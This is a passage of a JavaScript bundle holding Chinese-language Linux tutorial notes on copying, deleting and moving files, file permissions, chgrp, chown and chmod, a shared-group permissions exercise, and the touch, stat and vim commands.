directory\r\n```\r\n\r\n**参数说明：**\r\n\r\n- -a：此选项通常在复制目录时使用，它保留链接、文件属性，并复制目录下的所有内容。其作用等于dpR参数组合。\r\n- -d：复制时保留链接。这里所说的链接相当于Windows系统中的快捷方式。\r\n- -f：覆盖已经存在的目标文件而不给出提示。\r\n- -i：与-f选项相反，在覆盖目标文件之前给出提示，要求用户确认是否覆盖，回答"y"时目标文件将被覆盖。\r\n- -p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。\r\n- -r/R：若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。\r\n- -l：不复制文件，只是生成链接文件。\r\n\r\n我们将当前目录"aaa/"下的所有目录以及文件复制到新目录"ccc"下，输入如下命令：\r\n\r\n**1、数据准备**\r\n\r\n创建aaa目录并且aaa下包含bbb目录\r\n\r\n```shell\r\nmkdir -p aaa/bbb\r\nmkdir -p ccc\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576561579056](./img/linux/java-linux/Linux-v10-01天-授课/1576561579056.png)\r\n\r\naaa目录下有bbb\r\n\r\nccc下面没有目录和文件\r\n\r\n**2、执行复制**\r\n\r\n```shell\r\ncp –r aaa/*  ccc  \r\n```\r\n\r\n执行效果如下\r\n\r\n我们将aaa下面的所有文件、目录复制到了目录c下面\r\n\r\n![1576562978352](./img/linux/java-linux/Linux-v10-01天-授课/1576562978352.png)\r\n\r\n> 总结：\r\n>\r\n> 用户使用该指令复制目录时，必须使用参数"-r"或者"-R"。\r\n>\r\n> 如果不加参数"-r"或者"-R",只复制文件，而略过目录\r\n\r\n#### 7) rm(删除目录)\r\n\r\n```\r\nLinux的rm命令相当于我们在Windows中通过鼠标或者快捷键删除文件或者目录\r\n```\r\n\r\nrm命令用于删除一个文件或者目录。\r\n\r\n使用权限：于目前目录有适当权限的所有使用者\r\n\r\n**语法**\r\n\r\n```shell\r\nrm [options] name...\r\n```\r\n\r\n**参数：**\r\n\r\n- -i 删除前逐一询问确认。\r\n- -f 即使原档案属性设为唯读，亦直接删除，无需逐一确认。\r\n- -r 将目录及以下之档案亦逐一删除。\r\n\r\n如果我们要删除文件可以直接使用rm命令，若删除目录则必须配合选项"-r"，例如：\r\n\r\n![1576563524635](./img/linux/java-linux/Linux-v10-01天-授课/1576563524635.png)\r\n\r\n```shell\r\nrm -r  ccc\r\n```\r\n\r\n执行删除，如下图\r\n\r\n![1576563827977](./img/linux/java-linux/Linux-v10-01天-授课/1576563827977.png)\r\n\r\n> 注意\r\n>\r\n> 文件一旦通过rm命令删除，则无法恢复，所以必须格外小心地使用该命令\r\n>\r\n> 如果删除文件（比如.sh 、.txt）\r\n>\r\n> 直接使用rm  name.txt\r\n\r\n#### 8) mv(移动文件)\r\n\r\n```\r\nLinux的mv命令相当于我们在Windows中通过鼠标或者快捷键剪切（+重命名）+粘贴文件或者目录\r\n```\r\n\r\nmv 命令用来为文件或目录改名、或将文件或目录移入其它位置\r\n\r\n**语法**\r\n\r\n```shell\r\nmv [options] source dest\r\nmv [options] source... directory\r\n```\r\n\r\n**参数说明：**\r\n\r\n- -i: 若指定目录已有同名文件，则先询问是否覆盖旧文件;\r\n- -f: 在 mv 操作要覆盖某已有的目标文件时不给任何指示;\r\n\r\n![1576565378463](./img/linux/java-linux/Linux-v10-01天-授课/1576565378463.png)\r\n\r\n将文件 aaa 更名为 bbb :\r\n\r\n![1576565459075](./img/linux/java-linux/Linux-v10-01天-授课/1576565459075.png)\r\n\r\n```shell\r\n1、创建aaa目录、\r\nmkdir  aaa\r\n2、开始重命名\r\nmv aaa bbb\r\n```\r\n\r\n执行后\r\n\r\n![1576565489569](./img/linux/java-linux/Linux-v10-01天-授课/1576565489569.png)\r\n\r\n将ccc目录放入ddd目录中。\r\n\r\n注意，如果ddd目录不存在，则该命令将ccc改名为ddd。\r\n\r\n```shell\r\n创建ccc\r\nmkdir ccc\r\n```\r\n\r\n![1576565710078](./img/linux/java-linux/Linux-v10-01天-授课/1576565710078.png)\r\n\r\n```shell\r\n开始移动\r\nmv ccc/ ddd \r\n```\r\n\r\n![1576565800010](./img/linux/java-linux/Linux-v10-01天-授课/1576565800010.png)\r\n\r\n由上图我们发现，由于ddd目录不存在，所以在mv的时候将ccc目录改名为了ddd。\r\n\r\n## 3.2 Linux 文件基本属性\r\n\r\n```\r\n在Wndows系统中，我们可以选中一个文件，右键属性，可以查看到这个文件的文件类型（基本信息），以及文件的权限信息，在Linux中，它是通过不同字符的排序顺序来表示文件的类型以及权限所属信息的。\r\n```\r\n\r\nLinux系统是一种典型的多用户系统，不同的用户处于不同的地位，拥有不同的权限。为了保护系统的安全性，Linux系统对不同的用户访问同一文件（包括目录文件）的权限做了不同的规定。\r\n\r\n下面我们就一起学习下Linux系统不同权限的文件和目录在怎么表示的\r\n\r\n在Linux中我们可以使用ll或者ls –l命令来显示一个文件的属性以及文件所属的用户和组，如：\r\n\r\n```shell\r\nls -l\r\n```\r\n\r\n![1576032746450](./img/linux/java-linux/Linux-v10-01天-授课/1576032746450.png)\r\n\r\n实例中，bin文件的第一个属性用"d"表示。"d"在Linux中代表该文件是一个目录文件。\r\n\r\n在Linux中第一个字符代表这个文件是目录、文件或链接文件等等。\r\n\r\n- 当为[ **d** ]则是目录\r\n- 当为[ **-** ]则是文件；\r\n- 若是[ **l** ]则表示为链接文档(link file)；\r\n- 若是[ **b** ]则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；\r\n- 若是[ **c** ]则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置)。\r\n\r\n接下来的字符中，以三个为一组，且均为『rwx』 的三个参数的组合。其中，[ r ]代表可读(read)、[ w ]代表可写(write)、[ x ]代表可执行(execute)。 要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号[ - ]而已。\r\n\r\n每个文件的属性由左边第一部分的10个字符来确定（如下图）。\r\n\r\n![1576460571985](./img/linux/java-linux/Linux-v10-01天-授课/1576460571985.png)\r\n\r\n从左至右用0-9这些数字来表示。\r\n\r\n第0位确定文件类型，第1-3位确定属主（该文件的所有者）拥有该文件的权限。\r\n\r\n第4-6位确定属组（所有者的同组用户）拥有该文件的权限，第7-9位确定其他用户拥有该文件的权限。\r\n\r\n\r\n\r\n其中，第1、4、7位表示读权限，如果用"r"字符表示，则有读权限，如果用"-"字符表示，则没有读权限；\r\n\r\n第2、5、8位表示写权限，如果用"w"字符表示，则有写权限，如果用"-"字符表示没有写权限；第3、6、9位表示可执行权限，如果用"x"字符表示，则有执行权限，如果用"-"字符表示，则没有执行权限。\r\n\r\n## 3.3 Linux文件属主和属组\r\n\r\n```\r\n引子：\r\n对于一个文件来说，它都有一个特定的所有者，也就是对该文件具有所有权的用户。\r\n也就是所谓的属主，它属于哪个用户的意思。\r\n除了属主，还有属组，也就是说，这个文件是属于哪个组的（用户所属的组）。\r\n文件的【属主】有一套【读写执行权限rwx】\r\n文件的【属组】有一套【读写执行权限rwx】\r\n还有它权限，下面我们在介绍\r\n```\r\n\r\n![1576402570345](./img/linux/java-linux/Linux-v10-01天-授课/1576402570345.png)\r\n\r\n在以上实例中，aaa文件是一个目录文件，属主和属组都为 itcast，属主有可读、可写、可执行的权限（rwx）；与属主同组的其他用户有可读可写和可执行的权限（rwx）；其他用户也有可读和可执行的权限（r-x）。\r\n\r\n### **3.3.1 chgrp更改属组**\r\n\r\n```\r\n实际开发中我们经常会创建新建目录和文件，一般情况下，通过命令进行新建，\r\n在创建完成后，使用不同的用户访问，可能就会出现报错，无法访问等等问题。\r\n然后经过一番这查找,发现该有的文件都在，大小写也没问题，路径也没问题\r\n其实并不是这些问题。而是权限问题导致我们无法访问！是因为一个文件默认隶属于一个属组，而使用其他用户访问这个文件肯定无法访问(因为访问用户所属的组和文件所在的不是同一个组)\r\n那么怎么可以正常访问呢？其实就是通过更改用户组（用户组、文件组）来解决这些问题\r\n```\r\n\r\nchgrp命令用于变更文件或目录的所属群组。\r\n\r\n文件或目录权限的的拥有者由所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可\r\n\r\n为了方便初学者记忆，可以将 chgrp 理解为是 "change group" 的缩写\r\n\r\n**语法如下**\r\n\r\n```\r\nchgrp [-cfhRv][--help][--version][所属群组][文件或目录...] 或 chgrp [-cfhRv][--help][--reference=<参考文件或目录>][--version][文件或目录...]\r\n```\r\n\r\n**改变文件的群组属性**\r\n\r\n我们通过root用户进入（如下图），上接上面的例子\r\n\r\n我们的aaa文件的属主和属组都属于itcast（如下图）\r\n\r\n![1576407437975](./img/linux/java-linux/Linux-v10-01天-授课/1576407437975.png)\r\n\r\n我们现在通过chgrp命令将文件aaa的属组更改成root（其他也可以）\r\n\r\n```shell\r\nchgrp -v root aaa\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576407536566](./img/linux/java-linux/Linux-v10-01天-授课/1576407536566.png)\r\n\r\n我们通过下面的命令查询文件aaa的属组是否发生了变化，执行\r\n\r\n```\r\nls -l\r\n```\r\n\r\n![1576407585301](./img/linux/java-linux/Linux-v10-01天-授课/1576407585301.png)\r\n\r\n由上图我们发现，文件aaa的属组由itcast变成了root\r\n\r\n这样的话，文件的属组就发生了变化。\r\n\r\n\r\n\r\n### 3.3.2 chown更改属主和属组**\r\n\r\n```\r\n我们为了让一些用户有权限查看某一文档，比如是一个时间表，而编写时间表的人要具有读写执行的权限(属主)\r\n我们想让一些用户知道这个时间表的内容，而不让他们修改，所以我们可以把这些用户都划到一个组（属组），然后来修改这个文件的权限，让用户组可读，这样用户组下面的每个用户都是可读的\r\n```\r\n\r\nLinux是多任务操作系统，所有的档案皆有拥有者。利用 chown 可以将档案的拥有者加以改变。一般来说，这个指令只有是由系统管理者(root)所使用，一般使用者没有权限可以改变别人的档案拥有者，也没有权限可以自己的档案拥有者改设为别人。只有系统管理者(root)才有这样的权限\r\n\r\n使用权限 : 管理员账户\r\n\r\n**语法如下**\r\n\r\n```\r\nchown [–R] 属主名 文件名\r\nchown [-R] 属主名：属组名 文件名\r\n```\r\n\r\n我们通过root用户进入（如下图），上接上面的例子\r\n\r\n我们的aaa文件的属主属于itcast、属组属于root\r\n\r\n我们现在通过chgrp命令将文件aaa的属主更改成root，执行\r\n\r\n```\r\n chown  root aaa\r\n```\r\n\r\n效果如下\r\n\r\n![1576407880885](./img/linux/java-linux/Linux-v10-01天-授课/1576407880885.png)\r\n\r\n我们通过下面的命令查询文件aaa的属主是否发生了变化，执行\r\n\r\n```\r\nls -l\r\n```\r\n\r\n![1576407928200](./img/linux/java-linux/Linux-v10-01天-授课/1576407928200.png)\r\n\r\n由上图我们发现，文件aaa的属主和属组都变成了root。\r\n\r\n**我们将aaa文件的拥有者与群组改回为itcast：**\r\n\r\n注意：chown命令可以更改属主和属组\r\n\r\n```\r\nchown itcast:itcast aaa\r\n```\r\n\r\n我们通过下面的命令查询文件aaa的属主是否发生了变化，执行\r\n\r\n```\r\nls -l\r\n```\r\n\r\n![1576408146911](./img/linux/java-linux/Linux-v10-01天-授课/1576408146911.png)\r\n\r\n由上图可知，aaa文件的属主和属组都被更改回来了。\r\n\r\n### 3.3.3 chmod权限命令\r\n\r\nLinux文件属性有两种设置方法，一种是数字，一种是符号\r\n\r\nLinux的文件调用权限分为三级 : 文件属主、属组、其他。利用 chmod 可以控制文件如何被他人所调用。\r\n\r\n**使用权限 : 所有使用者**\r\n\r\n**语法**\r\n\r\n```\r\nchmod [-cfvR] [--help] [--version] mode file...\r\n```\r\n\r\n**参数说明**\r\n\r\n\r\nmode : 权限设定字串，格式如下\r\n\r\n```\r\n[ugoa...][[+-=][rwxX]...][,...]\r\n```\r\n\r\n**解释：**\r\n\r\nu 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。\r\n\r\n+表示增加权限、- 表示取消权限、= 表示唯一设定权限。\r\nr 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。\r\n\r\n#### **1) 数字权限**\r\n\r\nLinux文件的基本权限就有九个，分别是owner/group/others三种身份各有自己的read/write/execute权限。\r\n\r\n先复习一下刚刚上面提到的数据：文件的权限字符为：『-rwxrwxrwx』， 这九个权限是三个三个一组（owner/group/others就是所说的三个一组 ）的，我们也可以使用数字来代表各个权限，各权限的分数对照表如下\r\n\r\n各权限的数字对照表：[r]:4;[w]:2;[x]:1;[-]:**0**\r\n\r\n![1576571902684](./img/linux/java-linux/Linux-v10-01天-授课/1576571902684.png)\r\n\r\n每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx---] 分数则是：\r\n\r\n- owner = rwx = 4+2+1 = 7\r\n- group = rwx = 4+2+1 = 7\r\n- others= --- = 0+0+0 = 0\r\n\r\n所以等一下我们设定权限的变更时，该文件的权限数字就是770啦,变更权限的指令chmod的语法是这样的\r\n\r\n```\r\nchmod [-R] xyz 文件或目录\r\n```\r\n\r\n选项与参数：\r\n\r\n- xyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。\r\n- -R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件都会变更\r\n\r\n上面的 可以表示如下\r\n\r\n```shell\r\nchmod  -R 770     档案或目录\r\n```\r\n\r\n> 上面说了这么多，我们举例说明一下：\r\n\r\n我们进入itcast用户创建文件czbk.txt\r\n\r\n```shell\r\ntouch as.txt\r\n```\r\n\r\n然后切换到root\r\n\r\n比如，我们如果要将as.txt这个文件所有的权限都设定启用\r\n\r\n![1576463267777](./img/linux/java-linux/Linux-v10-01天-授课/1576463267777.png)\r\n\r\n那么命令如下：\r\n\r\n```shell\r\nchmod -R 777 as.txt\r\n```\r\n\r\n![1576463303277](./img/linux/java-linux/Linux-v10-01天-授课/1576463303277.png)\r\n\r\n由此可见，as.txt的属主权限、属组权限、其他权限都发生了改变\r\n\r\n由之前的【-rw-rw-r--】变成【-rwxrwxrwx】\r\n\r\n> 根据前面的换算我们已经知道如何将一个文件的属主、属组、其他权限换算成数字了，换算成数字后，我们只需要通过chmod命令即可更改文件的权限\r\n\r\n#### **2) 符号权限**\r\n\r\n还有一个改变权限的方法，就是 符号权限，我们先回顾下之前提到的9个权限\r\n\r\n- (1)user     属主权限\r\n- (2)group  属组权限\r\n- (3)others  其他权限\r\n\r\n那么我们就可以使用 **u, g, o** 来代表三种身份的权限！\r\n\r\n此外， **a** 则代表 **all**，即全部的身份。读写的权限可以写成 **r, w, x**，也就是可以使用下表的方式来看\r\n\r\n![1576464280724](./img/linux/java-linux/Linux-v10-01天-授课/1576464280724.png)\r\n\r\n如果我们需要将文件权限设置为 **-rwxr-xr--** ，可以使用 **chmod u=rwx,g=rx,o=r 文件名** 来设定:\r\n\r\n上接上面的例子，如下图\r\n\r\n我们将as.txt的权限设置为**-rwxr-xr--**\r\n\r\n![1576464462903](./img/linux/java-linux/Linux-v10-01天-授课/1576464462903.png)\r\n\r\n执行\r\n\r\n```shell\r\nchmod u=rwx,g=rx,o=r  as.txt\r\n```\r\n\r\n![1576464626496](./img/linux/java-linux/Linux-v10-01天-授课/1576464626496.png)\r\n\r\n 由上图我们发现，as.txt的权限变成了-rwxr-xr--\r\n\r\n假如我们要将权限去掉而不改变其他已存在的权限呢？举个例子，比如我要拿掉全部人的可读权限，则\r\n\r\n```SHELL\r\n chmod  a-r as.txt\r\n```\r\n\r\n执行如下\r\n\r\n![1576464852969](./img/linux/java-linux/Linux-v10-01天-授课/1576464852969.png)\r\n\r\n由此可见，as.txt的其他权限都没有了，变成了【---】\r\n\r\n## 3.4 综合案例\r\n\r\n```\r\n在前面的章节中我们讲解了用户、用户组、文件属主、属组以及权限，知识点比较零散，下面，我们就通过一个简单小案例把这些知识点串联起来\r\n```\r\n\r\n**需求：**\r\n\r\n比如一个公司的开发团队有三个用户：java、erlang、golang有一个文件目录tmp/work供他们开发，如何实现让这三个用户都对其具有写权限\r\n\r\n**1、首先，我们创建三个账户**（切换到root）\r\n\r\n```shell\r\nadduser java\r\nadduser erlang\r\nadduser golang\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576587867858](./img/linux/java-linux/Linux-v10-01天-授课/1576587867858.png)\r\n\r\n**2、增加用户组**\r\n\r\n```shell\r\ngroupadd -g 8888 dev-group\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576588353612](./img/linux/java-linux/Linux-v10-01天-授课/1576588353612.png)\r\n\r\n**3、创建公共文件并设置权限**\r\n\r\n给文件/tmp/project2019/设置属组为dev-group\r\n\r\n```shell\r\n mkdir /tmp/project2019\r\n \r\n chown -R :dev-group /tmp/project2019/\r\n 或者\r\n chgrp -R dev-group  /tmp/project2019/\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576588480909](./img/linux/java-linux/Linux-v10-01天-授课/1576588480909.png)\r\n\r\n**4、将用户添加到组**\r\n\r\n```shell\r\ngpasswd -a java    dev-group\r\ngpasswd -a erlang  dev-group\r\ngpasswd -a golang  dev-group\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576588553969](./img/linux/java-linux/Linux-v10-01天-授课/1576588553969.png)\r\n\r\n查询dev-group组下所有用户\r\n\r\n```shell\r\n grep \'dev-group\' /etc/group\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576588591503](./img/linux/java-linux/Linux-v10-01天-授课/1576588591503.png)\r\n\r\n**5、切换到java用户**\r\n\r\n切换到java用户看看是否有写入权限\r\n\r\n```shell\r\nsu java\r\n```\r\n\r\n![1576588731114](./img/linux/java-linux/Linux-v10-01天-授课/1576588731114.png)\r\n\r\n新建文件\r\n\r\n在我们上面创建的目录tmp/project2019/下面创建文件\r\n\r\n```shell\r\nmkdir java-files-new\r\n```\r\n\r\n![1576588941546](./img/linux/java-linux/Linux-v10-01天-授课/1576588941546.png)\r\n\r\n由此发现，我们在tmp/project2019/下面创建文件发生了权限不足，我们去查看下tmp/project2019/的文件属性，如下图\r\n\r\n我们在/tmp目录下执行\r\n\r\n```\r\nls -l\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576589157095](./img/linux/java-linux/Linux-v10-01天-授课/1576589157095.png)\r\n\r\n 我们发现目录project2019的文件属性为【drwxr-xr-x】\r\n\r\n根据前面学的知识，我们拆分如下\r\n\r\n【d】:文件类型\r\n\r\n【rwx】：属主\r\n\r\n【r-x】：属组\r\n\r\n【r-x】：其他\r\n\r\n现在答案就出来了，也就是说我们的属组权限是【r-x】，只有读和执行权限，没有写入权限，那么下面我们就给project2019目录增加写入权限。\r\n\r\n**6、增加写入权限**\r\n\r\n给project2019目录增加写入权限，执行下面的命令（前面已经学习过了）\r\n\r\n记得切换到root下执行\r\n\r\n```shell\r\nchmod  -R 770  project2019\r\n```\r\n\r\n执行效果如下![1576589467908](./img/linux/java-linux/Linux-v10-01天-授课/1576589467908.png)\r\n\r\n此时我们发现project2019目录的属组权限变成了【rwx】即可读、可写、可执行\r\n\r\n**7、切换用户，继续写入**\r\n\r\n```shell\r\nsu  java\r\nmkdir java-files-new\r\nls -l\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576589641341](./img/linux/java-linux/Linux-v10-01天-授课/1576589641341.png)\r\n\r\n由此发现，这个时候我们有了写入权限，java-files-new文件被成功写入\r\n\r\n那么，其他两个用户golang、erlang也是和java一个组的，他们能不能正常写入呢，我们试试（从root切换过去）\r\n\r\n```shell\r\nsu\r\nsu erlang\r\nmkdir erlang-files-new\r\n==============================\r\nsu\r\nsu golang\r\nmkdir golang-files-new\r\n\r\nls -l\r\n```\r\n\r\n执行效果（erlang新建文件）\r\n\r\n![1576589820604](./img/linux/java-linux/Linux-v10-01天-授课/1576589820604.png)\r\n\r\n执行效果（golanglang新建文件）\r\n\r\n![1576589856968](./img/linux/java-linux/Linux-v10-01天-授课/1576589856968.png)\r\n\r\n查看所有文件\r\n\r\n![1576589903617](./img/linux/java-linux/Linux-v10-01天-授课/1576589903617.png)\r\n\r\n由此可见，我们组的三个用户都成功创建了文件（拥有了写入权限）\r\n\r\n**8、验证结论**\r\n\r\n为了验证上面的结论，我们新增一个用户itbeijing\r\n\r\n看看能否正常新建文件\r\n\r\n```shell\r\nuseradd   itbeijing\r\nsu itbeijing\r\nmkdir  itbeijing-files-new\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576590031376](./img/linux/java-linux/Linux-v10-01天-授课/1576590031376.png)\r\n\r\n由上图我们发现，我们刚刚新创建的用户在创建文件的时候发现了权限不足。\r\n\r\n由此说明用户itbeijing用户的属组和文件的属组不一样，所以没有权限。\r\n\r\n## 3.5 总结\r\n\r\n在企业级开发过程中，实际操作目录是最经常出现的，对于目录常用命令我们要熟练掌握并能熟练编写\r\n因为Linux是多用户系统，所以权限也是非常核心和重要的，我们要熟练编写权限（属主、属组、其他权限）的常用命令。',pr={data:function(){return{MainComponent:cr}}},ur=pr,mr=Object(c["a"])(ur,or,lr,!1,null,"f4fc4986",null),dr=mr.exports,gr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},br=[],vr='# Linux-v10.0-02天-课堂笔记\r\n\r\n学习目标\r\n\r\n- 能够熟练编写文件相关命令\r\n- 能够熟练编写文件解压缩命令\r\n- 能够熟练编写网络查看简单命令\r\n- 能够熟练编写查看磁盘命令、挂载命令\r\n- 能够知道如何使用命令进行分区、格式化\r\n- 能够熟练使用yum进行查找、安装、卸载软件\r\n- 能够熟练使用rpm进行查找、安装、卸载软件\r\n- 能够熟练编写常用的shell脚本\r\n\r\n#  1 Linux文件管理\r\n\r\n## 1.1 touch命令\r\n\r\n```\r\n在Windows系统中，我们如果想创建一个文本文档或者word文件的时候，通常的做法是\r\n鼠标右键---新建---文本文档，这样的话，我们就成功的创建了一个文件，而在Linux中，我们可以通过字符命令的形式进行创建\r\n```\r\n\r\ntouch命令用于创建文件、修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。\r\n\r\nls -l 可以显示档案的时间记录\r\n\r\n**使用者权限：所有权限用户**\r\n\r\n**语法**\r\n\r\n```\r\ntouch [-acfm][-d<日期时间>][-r<参考文件或目录>] [-t<日期时间>][--help][--version][文件或目录…]\r\n```\r\n\r\n- **参数说明**：\r\n- a 改变档案的读取时间记录。\r\n- m 改变档案的修改时间记录。\r\n- c 假如目的档案不存在，不会建立新的档案。与 --no-create 的效果一样。\r\n- f 不使用，是为了与其他 unix 系统的相容性而保留。\r\n- r 使用参考档的时间记录，与 --file 的效果一样。\r\n- d 设定时间与日期，可以使用各种不同的格式。\r\n- t 设定档案的时间记录，格式与 date 指令相同。\r\n- --no-create 不会建立新档案。\r\n- --help 列出指令格式。\r\n- --version 列出版本讯息。\r\n\r\n**使用 touch 创建一个空文件**\r\n\r\n在 Linux 系统上使用 `touch` 命令创建空文件，键入 `touch`，然后输入文件名。如下所示\r\n\r\n```shell\r\ntouch czbk-devops.txt\r\n```\r\n\r\n查看\r\n\r\n```shell\r\nls -l czbk-devops.txt\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576640085716](./img/linux/java-linux/Linux-v10-02天-授课/1576640085716.png)\r\n\r\n**使用 touch 创建批量空文件**\r\n\r\n在实际的开发过程中可能会出现一些情况，我们必须为某些测试创建大量空文件，这可以使用 `touch` 命令轻松实现\r\n\r\n```shell\r\ntouch czbk-{1..10}.txt\r\n```\r\n\r\n在上面的例子中，我们创建了 10 个名为 czbk-1.txt` 到 `czbk-10.txt` 的空文件，你可以根据需要更改名称和数字\r\n\r\n执行查看命令\r\n\r\n```shell\r\nls -l\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576640392259](./img/linux/java-linux/Linux-v10-02天-授课/1576640392259.png)\r\n\r\n由上图我们发现，我们通过批量命令创建了10个txt文件\r\n\r\n**改变/更新文件访问时间**\r\n\r\n假设我们想要改变名为 czbk-devops.txt 文件的访问时间，在 `touch` 命令中使用 `-a` 选项，然后输入文件名。如下所示：\r\n\r\n1、我们先 查看下czbk-devops.txt的时间属性\r\n\r\n```shell\r\nls -l czbk-devops.txt \r\n```\r\n\r\n执行效果如下\r\n\r\n![1576648168657](./img/linux/java-linux/Linux-v10-02天-授课/1576648168657.png)\r\n\r\n我们发现，最后的访问时间是12月 18 11:34\r\n\r\n更新时间属性，如下\r\n\r\n```shell\r\ntouch czbk-devops.txt \r\n```\r\n\r\n执行ls命令查看，如下\r\n\r\n```shell\r\nls -l czbk-devops.txt \r\n```\r\n\r\n![1576648319770](./img/linux/java-linux/Linux-v10-02天-授课/1576648319770.png)\r\n\r\n我们发现，访问时间变成了 12月 18 13:50\r\n\r\n我们也可以使用stat命令进行查看，如下：\r\n\r\n```shell\r\nstat czbk-devops.txt \r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576648420787](./img/linux/java-linux/Linux-v10-02天-授课/1576648420787.png)\r\n\r\n由上图可知：czbk-devops.txt的文件属性、包含访问时间、更改时间、最近改动时间都显示出来了。\r\n\r\n **关于stat命令：**\r\n\r\n**stat命令用于显示inode内容。**\r\n\r\nstat以文字的格式来显示inode的内容。\r\n\r\n**语法**\r\n\r\n```\r\nstat [文件或目录]\r\n```\r\n\r\n## 1.2 vi与vim命令\r\n\r\n### 1.2.1 vi/vim介绍\r\n\r\n```\r\n使用vi/vim其实就相当于我们在Windows系统中创建文件、打开文件、编辑文件、保存文件操作\r\n```\r\n\r\n**1、vi介绍**\r\n\r\nvi是 `visual interface`的简称, 是linux中**最经典**的文本编辑器。\r\n\r\n- vi的特点\r\n  - 只能是编辑 **文本内容**, 不能对 字体 段落进行排版\r\n  - **不支持鼠标操作**\r\n  - **没有菜单**\r\n  - **只有命令**\r\n- vi编辑器在 **系统管理 服务器管理** 编辑文件时, **其功能永远不是图形界面的编辑器能比拟的**\r\n\r\n**2、vim介绍**\r\n\r\n**vim**:是从 vi （系统内置命令）发展出来的一个文本编辑器。代码补全、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。\r\n\r\n简单的来说， vi 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。 \r\n\r\nvim 则可以说是程序开发者的一项很好用的工具。\r\n\r\n### 1.2.2 vi/vim模式\r\n\r\nvi/vim模式主要分为以下三种：\r\n\r\n**命令模式**：在Linux终端中输入“vim 文件名”就进入了命令模式,但不能输入文字。\r\n**编辑模式：**在命令模式下按i就会进入编辑模式，此时就可以写入程式，按Esc可回到命令模式。\r\n**末行模式：**在命令模式下按：进入末行模式，左下角会有一个冒号出现，此时可以敲入命令并执行。\r\n\r\n下面是三种模式的简单分析图：\r\n\r\n![1576653460302](./img/linux/java-linux/Linux-v10-02天-授课/1576653460302.png)\r\n\r\n> 上图总结\r\n>\r\n> 上面的三种模式简单总结下就是：\r\n>\r\n> 1、vim  开始进入时是命令模式\r\n>\r\n> 2、按下I的时候会进入编辑模式\r\n>\r\n> 3、按下ESC然后在按下：的时候是末行模式\r\n\r\n\r\n\r\n###  1.2.3 打开和新建文件\r\n\r\n```\r\n使用vim不但可以打开一个现存的文件；也可以生成（vim后的文件不存在的情况下）一个文件；有点类似于我们在Windows中输入notepad命令一样，我们输入notepad后就会打开一个文本文档，然后进行编辑--另存为。\r\n```\r\n\r\n**使用者权限：当前文件的权限用户**\r\n\r\n- 在终端中输入vim在后面跟上 文件名 即可\r\n\r\n```\r\nvim txtfile.txt\r\n```\r\n\r\n- 如果文件已经存在, 会直接打开该文件\r\n- 如果文件不存在, 保存且退出时 就会新建一个文件\r\n\r\n> 注意\r\n>\r\n> 我们通过下面的三种模式切换详细阐述vim的用法\r\n\r\n###  1.2.4 三种模式切换\r\n\r\n**1、进入命令模式**\r\n\r\n上接上面的例子，我们执行下面的命令其实就是进入了命令模式\r\n\r\n```shell\r\nvim txtfile.txt\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576655123201](./img/linux/java-linux/Linux-v10-02天-授课/1576655123201.png)\r\n\r\n**2、进入编辑模式**\r\n\r\n上接上面的例子，按i进入插入模式\r\n\r\n- 在 vi 中除了常用 `i` 进入**编辑模式** 外, 还提供了一下命令同样可以进入编辑模式\r\n\r\n| 命令 | 英文   | 功能                   | 常用   |\r\n| ---- | ------ | ---------------------- | ------ |\r\n| i    | insert | 在当前字符前插入文本   | 常用   |\r\n| I    | insert | 在行首插入文本         | 较常用 |\r\n| a    | append | 在当前字符后添加文本   |        |\r\n| A    | append | 在行末添加文本         | 较常用 |\r\n| o    |        | 在当前行后面插入一空行 | 常用   |\r\n| O    |        | 在当前行前面插入一空行 | 常用   |\r\n\r\n上图可以表现为以下形式，如下图\r\n\r\n![1576663442969](./img/linux/java-linux/Linux-v10-02天-授课/1576663442969.png)\r\n\r\n执行效果如下图\r\n\r\n![1576655181144](./img/linux/java-linux/Linux-v10-02天-授课/1576655181144.png)\r\n\r\n由上图左下角我们看到【插入】（英文版为INSERT）,说明我们进入了编辑模式\r\n\r\n我们在里面插入数据，如下图\r\n\r\n因为我们是一个空文件，所以使用【I】或者【i】都可以\r\n\r\n如果里面的文本很多，要使用【A】进入编辑模式，即在行末添加文本\r\n\r\n![1576655270283](./img/linux/java-linux/Linux-v10-02天-授课/1576655270283.png)\r\n\r\n**3、进入末行模式**\r\n\r\n编辑模式不能保存文件\r\n必须先推到命令模式\r\n先按Esc键退出到命令模式\r\n然后按小写的**:wq 正常保存退出**\r\n\r\n进入末行模式—》按符号： 鼠标跑到屏幕的最后一行，执行效果如下图\r\n\r\n![1576655879564](./img/linux/java-linux/Linux-v10-02天-授课/1576655879564.png)\r\n\r\n然后按小写的**:wq 